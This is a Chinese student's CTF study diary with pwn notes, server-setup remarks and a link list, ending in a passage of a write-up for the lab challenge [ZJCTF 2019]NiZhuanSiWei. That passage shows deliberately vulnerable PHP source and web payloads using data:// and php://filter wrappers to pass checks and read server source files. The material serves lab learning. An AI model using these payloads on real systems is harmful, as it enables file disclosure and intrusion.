<p>&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;&#x4E86;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7684;PHP&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x4EE5;&#x53CA;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5185;&#x5BB9;</p>
<p><img src="/2022/07/30/7-30/7-30/1660036907507.png" alt="1660036907507"></p>
<p>&#x8FD9;&#x4E24;&#x7BC7;&#x6587;&#x7AE0;&#x8BB2;&#x4E86;PHP&#x7684;&#x6D41;&#x5C01;&#x88C5;&#x534F;&#x8BAE;&#xFF0C;PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;pop&#x94FE;&#x7684;&#x6784;&#x9020;</p>
<ul>
<li>tutorial &#x6559;&#x7A0B;</li>
<li>wrapper &#x5C01;&#x88C5;</li>
<li>stream_open_wrapper_ex &#x5F88;&#x591A;PHP&#x7684;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#x6E90;&#x7801;&#x90FD;&#x7528;&#x4E86;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;</li>
</ul>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2958#toc-9">Phar&#x4E0E;Stream Wrapper&#x9020;&#x6210;PHP RCE&#x7684;&#x6DF1;&#x5165;&#x6316;&#x6398; - &#x5148;&#x77E5;&#x793E;&#x533A; (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>&#x5927;&#x5E08;&#x5085;&#x501F;&#x9274;&#x7684;&#x5927;&#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;</p>
<ul>
<li>POP(Property-Oriented Programming)&#xFF0C;&#x662F;Esser&#x5728;2009&#x5E74;&#x7684;&#x65F6;&#x5019;&#x63D0;&#x51FA;&#x7684;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x6CE8;&#x5165;&#x7684;&#x5229;&#x7528;&#x65B9;&#x6CD5;&#x3002;</li>
</ul>
<hr>

        <h1 id="&#x5B66;&#x5417;&#x653B;&#x9632;&#x4E16;&#x754C;">
          <a href="#&#x5B66;&#x5417;&#x653B;&#x9632;&#x4E16;&#x754C;" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x5B66;&#x5417;&#x653B;&#x9632;&#x4E16;&#x754C;" class="headerlink" title="&#x5B66;&#x5417;&#x653B;&#x9632;&#x4E16;&#x754C;"></a>&#x5B66;&#x5417;&#x653B;&#x9632;&#x4E16;&#x754C;</h1>
      
        <h2 id="20220816">
          <a href="#20220816" class="heading-link"><i class="fas fa-link"></i></a><a href="#20220816" class="headerlink" title="20220816"></a>20220816</h2>
      <p>pwn..&#x60F3;&#x4E0D;&#x5230;&#x6709;&#x4E00;&#x5929;pwn&#x6BD4;&#x770B;web&#x8981;&#x8F7B;&#x677E;&#x4E00;&#x70B9;&#xFF0C;&#x4E5F;&#x8BB8;&#x662F;&#x522B;&#x4EBA;&#x8BB2;&#x4E86;&#x4E0D;&#x7528;&#x52A8;&#x8111;&#x5B50;&#xFF08;B&#x7AD9;&#x4E00;&#x4E2A;&#x5E08;&#x5085;&#x4E09;&#x5C0F;&#x65F6;&#x8BB2;&#x5B8C;pwn&#x653B;&#x9632;&#x4E16;&#x754C;&#x7684;&#x5165;&#x95E8;&#xFF09;</p>
<p>&#x4ECA;&#x5929;&#x770B;&#x4E86;&#x7B2C;&#x4E00;&#x9898;</p>
<p>&#x5B66;&#x4E60;&#x4E86;&#x8FD9;&#x4E9B;&#x5173;&#x952E;&#x8BCD;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">stack  &#x6808;</span><br><span class="line">reap	&#x5806;</span><br><span class="line">dp&#x6307;&#x9488;</span><br><span class="line">&#x6307;&#x9488;&#x5F80;&#x4E0B;&#x8D70;&#xFF0C;&#x6808;&#x662F;&#x5F80;&#x4E0A;&#x586B;</span><br><span class="line">&#x7B2C;&#x4E00;&#x9898;&#x5C31;&#x662F;&#x6808;&#x6EA2;&#x51FA;</span><br><span class="line">#1.&#x9996;&#x5148;&#x5148;&#x7528;sec --file&#x7B2C;&#x4E00;&#x9898;&#x7684;&#x6587;&#x4EF6;&#x540D;   ??&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x6709;&#x65E0;&#x4FDD;&#x62A4;&#xFF1F;&#xFF1F;&#x5FD8;&#x4E86;&#x662F;&#x4E0D;&#x662F;&#x8FD9;&#x4E2A;&#x4E86;</span><br><span class="line">&#x53D1;&#x73B0;&#x6709;&#x4FDD;&#x62A4;&#xFF0C;&#x7136;&#x540E;&#x601D;&#x8003;&#x5982;&#x4F55;&#x7ED5;&#x8FC7;</span><br><span class="line">2.&#x62D6;&#x8FDB;ida&#x67E5;&#x770B;&#x4F2A;&#x4EE3;&#x7801;&#xFF0C;&#x53D1;&#x73B0;&#x6709;&#x5371;&#x9669;&#x7684;get&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;&#x8BE5;&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x65E0;&#x9650;&#x586B;&#x5145;</span><br><span class="line"></span><br><span class="line">3.&#x5199;py&#x7684;payload</span><br><span class="line">from pwntools import *</span><br><span class="line">import os  //??</span><br><span class="line">#&#x6253;&#x5F00;&#x6587;&#x4EF6;&#xFF0C;&#x8FDE;&#x63A5;ip&#x5730;&#x5740;</span><br><span class="line">#&#x5F00;&#x59CB;&#x5199;payload</span><br><span class="line">recvutil(&quot;&quot;);  &#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7528;&#x4E8E;&#x63A5;&#x53D7;&#x5B57;&#x7B26;&#x4E32;&#x5230;&#x54EA;&#x4E00;&#x4E32;&#xFF0C;&#x4F8B;&#x5982;&#x201C;&#x8BF7;&#x8F93;&#x5165;&#x5E74;&#x4EFD;&#x201D;</span><br><span class="line">&#x4F3C;&#x4E4E;&#x540E;&#x9762;&#x662F;&#x4F7F;&#x7528;&#x6808;&#x6EA2;&#x51FA;&#xFF0C;&#x5148;&#x586B;&#x5145;&#x8FA3;&#x9E21;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x8F93;&#x5165;&#x9700;&#x8981;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x8FBE;&#x5230;&#x7ED5;&#x8FC7;&#x7684;&#x76EE;&#x7684;</span><br></pre></td></tr></table></div></figure>

<hr>

        <h3 id="&#x963F;&#x4F1F;&#x4F60;&#x53C8;&#x5728;&#x642D;&#x535A;&#x5BA2;&#x62C9;">
          <a href="#&#x963F;&#x4F1F;&#x4F60;&#x53C8;&#x5728;&#x642D;&#x535A;&#x5BA2;&#x62C9;" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x963F;&#x4F1F;&#x4F60;&#x53C8;&#x5728;&#x642D;&#x535A;&#x5BA2;&#x62C9;" class="headerlink" title="&#x963F;&#x4F1F;&#x4F60;&#x53C8;&#x5728;&#x642D;&#x535A;&#x5BA2;&#x62C9;"></a>&#x963F;&#x4F1F;&#x4F60;&#x53C8;&#x5728;&#x642D;&#x535A;&#x5BA2;&#x62C9;</h3>
      <p>&#x4ECA;&#x5929;&#x770B;&#x4E86;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x786E;&#x5B9E;&#x53EF;&#x4EE5;&#x642D;&#x5EFA;&#x591A;&#x4E2A;&#x7AD9;&#x70B9;&#x6709;&#x51E0;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x8BB0;&#x5230;&#x8111;&#x5B50;&#x91CC;&#x7684;&#x6709;&#x4E24;&#x79CD;</p>
<ul>
<li>&#x4F7F;&#x7528;Nginx&#x7684;&#x53CD;&#x5411;&#x4EE3;&#x7406;</li>
<li>&#x4F7F;&#x7528;&#x4E8C;&#x7EA7;&#x57DF;&#x540D;&#xFF0C;&#x8BA9;&#x4E0D;&#x540C;&#x7684;&#x57DF;&#x540D;&#x8BBF;&#x95EE;&#x5230;&#x76F8;&#x5E94;&#x7684;&#x6587;&#x4EF6;&#x5939;&#x5373;&#x53EF;</li>
</ul>
<p>&#x7136;&#x540E;&#x4ECA;&#x5929;&#x8FD8;&#x662F;&#x6CA1;&#x6709;&#x641E;&#x61C2;ssh&#xFF0C;&#x5927;&#x62B5;&#x662F;&#x770B;&#x7740;&#x592A;&#x9EBB;&#x70E6;&#x4E86;&#x5427;</p>
<p>&#x53CD;&#x6B63;&#x4EE5;&#x540E;&#x7528;hexo&#x8FD8;&#x662F;&#x8981;&#x7528;ssh,hhh</p>
<p>&#x987A;&#x4FBF;&#x4E00;&#x63D0;&#xFF0C;&#x597D;&#x50CF;&#x53D1;&#x73B0;&#x7528;&#x5B9D;&#x5854;&#x9762;&#x677F;&#x642D;&#x5EFA;typecho&#x6BD4;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x96C6;&#x6210;&#x7684;typecho&#x5E94;&#x7528;&#x8981;&#x597D;&#x70B9;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x6837;&#x6211;&#x5C31;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x642D;&#x591A;&#x4E2A;&#x7AD9;&#x70B9;&#x4E86;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x5565;&#x4E5F;&#x4E0D;&#x4F1A;&#x4EE5;&#xFF0C;&#x76F4;&#x63A5;&#x7528;NGINX&#x6211;&#x4E5F;&#x4E0D;&#x4F1A;&#x554A;</p>
<hr>
<p>&#x54C8;&#x54C8;&#xFF0C;&#x5FEB;&#x53BB;&#x5B66;&#x6C47;&#x7F16;&#x7F62;&#xFF0C;&#x4E24;&#x5929;&#x5165;&#x95E8;&#x591F;&#x4E86;&#x591F;&#x4E86;&#xFF0C;&#x6BD5;&#x7ADF;&#x5F00;&#x5B66;&#x4E5F;&#x5C31;&#x4E0A;&#x4E24;&#x8282;&#x8BFE;</p>
<hr>

        <h2 id="20220819">
          <a href="#20220819" class="heading-link"><i class="fas fa-link"></i></a><a href="#20220819" class="headerlink" title="20220819"></a>20220819</h2>
      <p>&#x715E;&#x7B14;&#x554A;&#xFF0C;&#x53C8;&#x6709;&#x4E24;&#x5929;&#x6CA1;&#x6709;&#x6253;&#x5F00;&#x7535;&#x8111;&#x4E86;&#xFF0C;&#x5DEE;&#x4E0D;&#x591A;&#x6709;&#x5341;&#x5929;&#x6CA1;&#x770B;&#x4E86;&#x5427;&#xFF0C;&#x715E;&#x7B14;&#x554A;&#xFF0C;&#x540C;&#x4E00;&#x4E2A;&#x5E74;&#x7684;&#x53EF;&#x4EE5;&#x641E;&#x5B9E;&#x6218;&#x4E86;&#xFF0C;&#x4F60;&#x8FD8;&#x6401;&#x7740;&#x770B;show&#x7684;&#x5165;&#x95E8;&#xFF0C;&#x8FD8;&#x5165;&#x4E0D;&#x4E86;&#x95E8;&#x662F;&#x5427;&#xFF0C;&#x91CD;&#x5F00;&#x7F62;&#xFF0C;&#x715E;&#x7B14;&#x554A;&#x554A;&#x554A;&#xFF0C;&#x91CD;&#x5F00;&#x6CA1;&#x673A;&#x4F1A;&#x5566;&#xFF0C;&#x5DF2;&#x7ECF;&#x7ED3;&#x675F;&#x52D2;!!!!!!</p>
<p>&#x642D;&#x4E2A;&#x9B3C;&#x7684;&#x535A;&#x5BA2;&#xFF0C;&#x5C31;&#x8FD9;&#x6837;&#x5427;&#xFF0C;&#x81EA;&#x5DF1;&#x8981;&#x8352;&#x5E9F;&#x65F6;&#x95F4;&#xFF01;&#x771F;&#x662F;&#x4EE4;&#x4EBA;&#x65E0;&#x8BED;&#xFF0C;&#x771F;&#x5C31;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5165;&#x95E8;&#x5B66;&#x4E00;&#x4E2A;&#x6708;&#x662F;&#x5427;&#xFF0C;&#x715E;&#x7B14;&#x554A;&#xFF0C;&#x51FA;&#x53BB;&#x73A9;&#x5E72;&#x751A;&#x4E48;&#x554A;&#xFF0C;&#x4F60;TM&#x4E4B;&#x524D;&#x5E72;&#x4EC0;&#x4E48;&#x53BB;&#x4E86;&#xFF0C;&#x6D6A;&#x8D39;&#x5728;&#x5237;&#x89C6;&#x9891;&#x4E0A;&#xFF0C;&#x6D6A;&#x8D39;&#x5728;&#x770B;&#x4E86;&#x4E5F;&#x6CA1;&#x610F;&#x601D;&#x7684;&#x756A;&#x5267;&#x4E0A;&#xFF0C;&#x715E;&#x7B14;&#xFF0C;&#x4F60;&#x81EA;&#x7701;&#x7F62;</p>

        <h2 id="20220820">
          <a href="#20220820" class="heading-link"><i class="fas fa-link"></i></a><a href="#20220820" class="headerlink" title="20220820"></a>20220820</h2>
      <p>&#x8352;&#x5E9F;&#x7A0B;&#x5EA6;&#x80DC;&#x4E8E;&#x6628;&#x5929;&#xFF0C;&#x770B;&#x4E86;&#x4E00;&#x773C;jwt&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x4E24;&#x53E5;&#x8BDD;&#xFF0C;&#x597D;&#x561B;&#xFF0C;&#x6362;&#x7740;&#x505A;&#x5427;&#xFF0C;&#x53CD;&#x6B63;&#x90FD;&#x4E00;&#x6837;&#xFF0C;&#x6BCF;&#x4E2A;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x5148;&#x770B;&#x770B;wp&#xFF0C;&#x518D;&#x5199;&#x9898;&#xFF0C;8.30&#x53F7;&#x4EE5;&#x524D;378+&#x722C;&#x866B;+&#x6570;&#x636E;&#x7ED3;&#x6784;&#x597D;&#x5427;</p>

        <h2 id="20220823">
          <a href="#20220823" class="heading-link"><i class="fas fa-link"></i></a><a href="#20220823" class="headerlink" title="20220823"></a>20220823</h2>
      <p>&#x770B;&#x5427;23&#x53F7;&#x5566;&#xFF0C;&#x5F88;&#x84DD;&#x7684;&#x5566;</p>
<ul>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.cnblogs.com/luogi/p/15469106.html">&#x4E8C;&#x7EF4;&#x7801;&#x4E4B;QR&#x7801;&#x751F;&#x6210;&#x539F;&#x7406;&#x4E0E;&#x635F;&#x574F;&#x4FEE;&#x590D; - luogi - &#x535A;&#x5BA2;&#x56ED; (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  &#x5927;&#x6982;&#x55B5;&#x4E86;&#x4E00;&#x773C;</li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://firmianay.gitbook.io/ctf-all-in-one/1_basic/1.5_reverse_basic">1.5 &#x9006;&#x5411;&#x5DE5;&#x7A0B;&#x57FA;&#x7840; - CTF-All-In-One (gitbook.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> &#x7559;&#x7740;&#x4E5F;&#x4E0D;&#x4F1A;&#x770B;&#xFF0C;&#x4F46;&#x5F88;&#x9002;&#x5408;&#x5165;&#x95E8;</li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/Merricx/qrazybox/tree/master/js">qrazybox/js at master &#xB7; Merricx/qrazybox (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> &#x4E8C;&#x7EF4;&#x7801;&#x4FEE;&#x6539;&#x5DE5;&#x5177;</li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/tokumeikoi/tidalab-trojan">tokumeikoi/tidalab-trojan (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> &#x6F6E;&#x6C50;&#x5B9E;&#x9A8C;&#x5BA4;&#xFF0C;&#x53D1;&#x73B0;&#x4E86;&#x4E0D;&#x5F97;&#x4E86;&#x7684;&#x4E1C;&#x897F;</li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://dekuzing.cn/">DekuZing&#x2019;s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>&#x8FD9;&#x4E2A;&#x5927;&#x54E5;&#x7684;&#x535A;&#x5BA2;&#x88AB;&#x706B;&#x7ED2;&#x76D1;&#x6D4B;&#x5230;&#x6709;&#x6BD2;</li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.jianshu.com/p/da6dae36c290">&#x4EC0;&#x4E48;&#x662F; UUID ? - &#x7B80;&#x4E66; (jianshu.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> UUID&#x7684;&#x7B97;&#x6CD5;</li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/dxj124/article/details/88895859"> inc&#x6587;&#x4EF6;&#x4ECB;&#x7ECD;_dxj124&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_inc&#x6587;&#x4EF6;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> inc&#x6587;&#x4EF6;&#x7684;&#x542B;&#x4E49;</li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45551083/article/details/109300305?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166118662816780357223316%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=166118662816780357223316&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-109300305-null-null.nonecase&amp;utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4450"> php Session&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;_lonmar~&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_session&#x6F0F;&#x6D1E;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/dxj124/article/details/88895859">https://blog.csdn.net/dxj124/article/details/88895859</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>)    &#x5927;&#x54E5;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x770B;&#x53F6;&#x4E5F;&#x6CA1;&#x8DDF;&#x7740;&#x505A;&#x4E00;&#x904D;&#x3002;&#x3002;</li>
<li><input disabled type="checkbox"> &#x4ECA;&#x5929;&#x5230;&#x6B64;&#x4E3A;&#x6B62;&#x5427;</li>
</ul>
<p>&#x77E5;&#x9053;&#x4E86;&#x638C;&#x4E0A;&#x534E;&#x5E08;&#x7684;&#x4E8C;&#x7EF4;&#x7801;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x5B83;&#xFF0C;&#x5F97;&#x5230;&#x65B0;&#x7684;&#x7801;</p>
<p><img src="/2022/07/30/7-30/7-30/1661185697137.png" alt="1661185697137"></p>
<p>&#x6709;&#x610F;&#x601D;</p>
<hr>
<p><img src="/2022/07/30/7-30/7-30/1661268623252.png" alt="1661268623252"></p>

        <h2 id="20220825">
          <a href="#20220825" class="heading-link"><i class="fas fa-link"></i></a><a href="#20220825" class="headerlink" title="20220825"></a>20220825</h2>
      <blockquote>
<p>&#x5728;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7684;&#x6982;&#x5FF5;&#x4E2D;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x5BF9;&#x8C61;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x7C7B;&#x6765;&#x63CF;&#x7ED8;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x53CD;&#x8FC7;&#x6765;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684;&#x7C7B;&#x90FD;&#x662F;&#x7528;&#x6765;&#x63CF;&#x7ED8;&#x5BF9;&#x8C61;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7C7B;&#x4E2D;&#x6CA1;&#x6709;&#x5305;&#x542B;&#x8DB3;&#x591F;&#x7684;&#x4FE1;&#x606F;&#x6765;&#x63CF;&#x7ED8;&#x4E00;&#x4E2A;&#x5177;&#x4F53;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x7C7B;&#x5C31;&#x662F;&#x62BD;&#x8C61;&#x7C7B;&#x3002;<br>        &#x62BD;&#x8C61;&#x7C7B;&#x9664;&#x4E86;&#x4E0D;&#x80FD;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x4E4B;&#x5916;&#xFF0C;&#x7C7B;&#x7684;&#x5176;&#x5B83;&#x529F;&#x80FD;&#x4F9D;&#x7136;&#x5B58;&#x5728;&#xFF0C;&#x6210;&#x5458;&#x53D8;&#x91CF;&#x3001;&#x6210;&#x5458;&#x65B9;&#x6CD5;&#x548C;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x7684;&#x8BBF;&#x95EE;&#x65B9;&#x5F0F;&#x548C;&#x666E;&#x901A;&#x7C7B;&#x4E00;&#x6837;&#x3002;<br>       &#x7531;&#x4E8E;&#x62BD;&#x8C61;&#x7C7B;&#x4E0D;&#x80FD;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;</p>
</blockquote>
<p>&#x8FD9;&#x91CC;&#x8BBE;&#x8BA1;&#x5230;&#x4E86;PHP&#x7684;&#x534F;&#x53D8;&#x4E0E;&#x9006;&#x53D8;</p>

        <h1 id="ZJCTF-2019-NiZhuanSiWei">
          <a href="#ZJCTF-2019-NiZhuanSiWei" class="heading-link"><i class="fas fa-link"></i></a><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1>
      <ul>
<li>&#x8003;&#x70B9;&#xFF1A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x6587;&#x4EF6;&#x5305;&#x542B;</li>
</ul>
<hr>
<p> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/113733607">ZJCTF 2019]NiZhuanSiWei_Sk1y&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">php&#x4F2A;&#x534F;&#x8BAE; - &#x770B;&#x4E0D;&#x5C3D;&#x7684;&#x5C18;&#x57C3; - &#x535A;&#x5BA2;&#x56ED; (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>&#x518D;&#x590D;&#x4E60;&#x4E00;&#x4E0B;&#x4F2A;&#x534F;&#x8BAE;&#xFF01;&#xFF01;</p>
<p>&#x6E90;&#x7801;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&apos;r&apos;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>)){</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&apos;r&apos;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>)){</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>&#x6709;&#x4E09;&#x5C42;&#xFF1A;</p>
<ul>
<li><p>&#x7B2C;&#x4E00;&#x5C42;text&#xFF1A;</p>
<ul>
<li>file_get_contents($text,&#x2019;r&#x2019;)===&#x201D;welcome to the zjctf&#x201D;</li>
</ul>
<blockquote>
<p>&#x5173;&#x4E8E;file_get_contents&#xFF1A;file_get_contents() &#x628A;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x8BFB;&#x5165;&#x4E00;&#x4E2A;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&amp;spm=1001.2101.3001.7020">&#x5B57;&#x7B26;&#x4E32;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>&#x4E2D;&#x3002;&#x4E0E;require&#x7565;&#x6709;&#x533A;&#x522B;</p>
</blockquote>
<p>&#x4F7F;&#x7528;<code>text=data://text/plain,base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>&#x6765;&#x4F20;&#x53C2;</p>
<p>&#x6216;&#x8005;</p>
<p>&#x5148;&#x7528;get&#x4F20;&#x53C2;<code>?text=php://input </code>&#xFF0C;&#x518D;&#x5728;post&#x91CC;&#x9762;&#x4F20;&#x53C2;<code>welcome to the zjctf</code></p>
</li>
<li><p>&#x7B2C;&#x4E8C;&#x5C42;file:</p>
<ul>
<li>&#x8981;&#x6C42;&#x5305;&#x542B;file&#x6587;&#x4EF6;&#xFF0C;&#x63D0;&#x793A;&#x6709;useless.php&#xFF0C;&#x6545;&#x5148;&#x7528;&#x4F2A;&#x534F;&#x8BAE;&#x5148;&#x8BFB;&#x4E00;&#x8BFB;&#x8BE5;&#x6587;&#x4EF6;&#x5185;&#x5BB9;</li>
</ul>
<p><code>&amp;file=php://filter/read=conver-encode.base64/resource=useless.php</code></p>
<p>&#x5F97;&#x5230;&#x4EE5;&#x4E0B;&#x6E90;&#x7801;</p>
</li>
</ul>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>{  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>{  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file)){  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        }  </span><br><span class="line">    }  </span><br><span class="line">}  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<ul>
<li><p>&#x7B2C;&#x4E09;&#x5C42;unserialize($password)&#xFF1A;</p>
<ul>
